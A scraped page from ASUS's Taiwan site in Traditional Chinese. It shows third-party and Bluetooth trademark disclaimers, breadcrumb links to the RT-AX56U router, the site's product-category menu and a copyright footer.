  + 如果您將本產品與第三方服務搭配使用，您需遵守第三方提供者的條款和隱私政策，並承擔相關風險。華碩不提供對非華碩產品的持續整合支援或保證。
  + 以上藍牙®文字標誌與標誌為Bluetooth SIG所有之註冊商標，﹝授權廠商﹞經授權使用該標誌。其他商標與商標名稱均屬其個別所有人所擁有

網通產品 / IoT / 伺服器

無線路由器
 [ASUS WiFi 路由器](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/) [RT-AX56U](https://www.asus.com/tw/networking-iot-servers/wifi-routers/asus-wifi-routers/rt-ax56u/)
## 購物和學習

  手機 / 電競掌機 [智慧手機](https://www.asus.com/tw/mobile-handhelds/phones/all-series/)智慧型手機配件平板電腦電競掌機穿戴裝置 & 智慧健康管理醫療器材軟體醫療解決方案 筆記型電腦 [家用](https://www.asus.com/tw/laptops/for-home/all-series/)[商用](https://www.asus.com/tw/laptops/for-work/all-series/)[學生](https://www.asus.com/tw/laptops/for-students/all-series/)[電競](https://www.asus.com/tw/laptops/for-gaming/all-series/)軟體技術與創新保固[台銀辦理政府採購](https://www.asus.com/tw/laptops/gov-procurement/all-series/)Copilot+ PC 顯示器 / 桌上型電腦 [顯示器/顯示器配件](https://www.asus.com/tw/displays-desktops/monitors/all-series/)[投影機](https://www.asus.com/tw/displays-desktops/projectors/all-series/)[All-in-One PCs](https://www.asus.com/tw/displays-desktops/all-in-one-pcs/all-series/)[桌上型電腦](https://www.asus.com/tw/displays-desktops/tower-pcs/all-series/)電競桌機NUCs[Mini PCs](https://www.asus.com/tw/displays-desktops/mini-pcs/all-series/)[工作站](https://www.asus.com/tw/displays-desktops/workstations/all-series/)[配件](https://www.asus.com/tw/displays-desktops/accessories/all-series/)軟體與技術創新(桌上型電腦)保固台銀辦理政府採購[智慧眼鏡](https://www.asus.com/tw/displays-desktops/glasses/all-series/) 主機板 / 零組件 [主機板](https://www.asus.com/tw/motherboards-components/motherboards/all-series/)[顯示卡](https://www.asus.com/tw/motherboards-components/graphics-cards/all-series/)[機殼](https://www.asus.com/tw/motherboards-components/cases/all-series/)[散熱器](https://www.asus.com/tw/motherboards-components/cooling/all-series/)[電源供應器](https://www.asus.com/tw/motherboards-components/power-supply-units/all-series/)[光碟機](https://www.asus.com/tw/motherboards-components/optical-drives/all-series/)[儲存裝置](https://www.asus.com/tw/motherboards-components/data-storage/all-series/)[顯示卡外接盒](https://www.asus.com/tw/motherboards-components/external-graphics-docks/all-series/)單板電腦音效卡軟體 網通產品 / IoT / 伺服器 [WiFi 7](https://www.asus.com/tw/networking-iot-servers/wifi-7/all-series/)[WiFi 6](https://www.asus.com/tw/networking-iot-servers/wifi-6/all-series/)[無線路由器](https://www.asus.com/tw/networking-iot-servers/wifi-routers/all-series/)[全屋網狀 Mesh WiFi 系統](https://www.asus.com/tw/networking-iot-servers/whole-home-mesh-wifi-system/all-series/)[商用網路方案](https://www.asus.com/tw/networking-iot-servers/business-network-solutions/all-series/)數據機路由器網卡[有線網路](https://www.asus.com/tw/networking-iot-servers/wired-networking/all-series/)[智慧機器人](https://www.asus.com/tw/networking-iot-servers/intelligent-robots/all-series/)[AIoT 工業解決方案](https://www.asus.com/tw/networking-iot-servers/aiot-industrial-solutions/all-series/)伺服器[智慧家庭應用](https://www.asus.com/tw/networking-iot-servers/smart-home/all-series/) 周邊配件 [鍵盤](https://www.asus.com/tw/accessories/keyboards/all-series/)[滑鼠 & 滑鼠墊](https://www.asus.com/tw/accessories/mice-and-mouse-pads/all-series/)[耳機](https://www.asus.com/tw/accessories/headsets-and-audio/all-series/)[串流媒體](https://www.asus.com/tw/accessories/streaming-kits/all-series/)[服飾、包包 & 其他周邊](https://www.asus.com/tw/accessories/apparel-bags-and-gear/all-series/)[保護配件與防護](https://www.asus.com/tw/accessories/cases-and-protection/all-series/)[電源適配器](https://www.asus.com/tw/accessories/adapters-and-chargers/all-series/)[底座 / 接收器 / 連接線](https://www.asus.com/tw/accessories/docks-dongles-and-cable/all-series/)[行動電源](https://www.asus.com/tw/accessories/power-banks/all-series/)觸控筆[控制器](https://www.asus.com/tw/accessories/controller/all-series/)

     Taiwan / 繁體中文
©ASUSTeK Computer Inc. All rights reserved.
 [使用條款](https://www.asus.com/tw/terms_of_use_notice_privacy_policy/official-site/)[隱私權保護政策](https://www.asus.com/tw/terms_of_use_notice_privacy_policy/privacy_policy/)

